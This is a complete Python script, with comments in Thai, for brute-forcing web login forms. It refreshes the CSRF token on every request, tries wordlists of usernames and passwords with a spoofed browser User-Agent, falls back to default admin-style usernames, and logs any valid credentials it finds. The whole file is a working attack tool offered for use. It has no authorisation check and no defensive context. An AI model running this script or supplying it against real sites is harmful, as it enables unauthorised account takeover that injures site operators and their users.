#!/usr/bin/env python3
"""
Bruter - Brute force login form ที่มี CSRF/Token โดยดึง token ใหม่ทุก request
รับ --url, --user-field/--pass-field/--csrf-field, --user-file, --pass-file
"""
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup


def get_csrf_token(url: str, token_name: str,
                   session: requests.Session | None = None,
                   timeout: int = 10) -> str | None:
    """ดึง CSRF token จาก hidden input ในหน้า form."""
    try:
        r = session.get(url, timeout=timeout) if session else requests.get(url, timeout=timeout)
        r.raise_for_status()
        html = r.text or ""
    except Exception:
        return None
    inp = BeautifulSoup(html, "html.parser").find("input", {"type": "hidden", "name": token_name})
    if inp and inp.get("value"):
        return inp["value"]
    for pat in [
        rf'<input[^>]+name=["\']({re.escape(token_name)})["\'][^>]+value=["\']([^"\']+)["\']',
        rf'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']({re.escape(token_name)})["\']',
    ]:
        m = re.search(pat, html, re.I)
        if m:
            return m.group(2 if "name" in pat[:20] else 1)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="Brute force login form with CSRF token refresh")
    parser.add_argument("--url",            required=True)
    parser.add_argument("--user-field",     default="username")
    parser.add_argument("--pass-field",     default="password")
    parser.add_argument("--csrf-field",     default=None)
    parser.add_argument("--extra",          default="",
                        help="Fixed params as key=val&key2=val2")
    parser.add_argument("--user-file",      default=None)
    parser.add_argument("--pass-file",      required=True)
    parser.add_argument("--failure-string", default="incorrect",
                        help="Substrings indicating login failed (separated by |)")
    parser.add_argument("--success-string", default="logout|logged in|welcome|dashboard|admin panel",
                        help="Substrings indicating login success (separated by |)")
    parser.add_argument("--timeout",        type=int, default=10)
    parser.add_argument("--output",         default=None,
                        help="Log file to append CREDENTIAL lines")
    parser.add_argument("--verbose",        action="store_true",
                        help="Print each attempt and failure reason")
    args = parser.parse_args()

    # ── load usernames ──
    users: list[str] = []
    if args.user_file and Path(args.user_file).exists():
        users = [l.strip() for l in Path(args.user_file).read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not users:
        users = ["admin", "root", "administrator", "user", "test", "guest"]

    # ── load passwords ──
    pass_path = Path(args.pass_file)
    if not pass_path.exists():
        print(f"[!] Pass file not found: {pass_path}", file=sys.stderr); sys.exit(2)
    passwords = [l.strip() for l in pass_path.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not passwords:
        print("[!] No passwords in file.", file=sys.stderr); sys.exit(2)

    # ── parse extra fixed params ──
    extra_dict: dict[str, str] = {}
    for part in (args.extra or "").split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            extra_dict[k.strip()] = v.strip()

    # ── pre-compute path constants ──
    login_path = urlparse(args.url).path.rstrip("/").lower()
    fail_parts    = [s.strip().lower() for s in args.failure_string.split("|") if s.strip()]
    success_parts = [s.strip().lower() for s in args.success_string.split("|") if s.strip()]

    session = requests.Session()
    session.headers["User-Agent"] = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    )

    found:    list[tuple[str, str]] = []
    attempts: int = 0

    for user in users:
        for password in passwords:
            # ── build POST body ──
            data: dict[str, str] = dict(extra_dict)
            data[args.user_field] = user
            data[args.pass_field] = password
            if args.csrf_field:
                token = get_csrf_token(args.url, args.csrf_field, session=session, timeout=args.timeout)
                if token is not None:
                    data[args.csrf_field] = token

            attempts += 1
            if args.verbose:
                print(f"[*] Trying {user}:{password}", flush=True)

            # ── attempt login ──
            success = False
            try:
                r    = session.post(args.url, data=data, timeout=args.timeout, allow_redirects=True)
                body = (r.text or "").lower()

                fail_str          = any(p in body for p in fail_parts) if fail_parts else False
                has_success_marker = any(p in body for p in success_parts) if success_parts else False
                final_path        = urlparse(r.url or "").path.rstrip("/").lower()
                redirected_away   = bool(r.history) and final_path != login_path

                success = (not fail_str) and (has_success_marker or redirected_away)

                if args.verbose and not success:
                    reason = []
                    if fail_str:              reason.append("fail_marker")
                    if not redirected_away:   reason.append(f"no_redirect(final={r.url})")
                    if not has_success_marker: reason.append("no_success_marker")
                    print(f"    → fail ({', '.join(reason)})", flush=True)

            except Exception as e:
                if args.verbose:
                    print(f"    → error: {e}", flush=True)

            # ── credential found — stop immediately ──
            if success:
                line = f"CREDENTIAL:\t{user}\t{password}"
                print(line, flush=True)
                if args.output:
                    # append mode — ไม่ throw ถ้าไฟล์ยังไม่มี
                    with open(args.output, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                found.append((user, password))
                break  # หยุด inner loop (passwords)

        if found:
            break  # หยุด outer loop (users)

    if not found:
        print(f"[*] Tried {attempts} combinations — no valid credential found.")

    sys.exit(0 if found else 1)


if __name__ == "__main__":
    main()
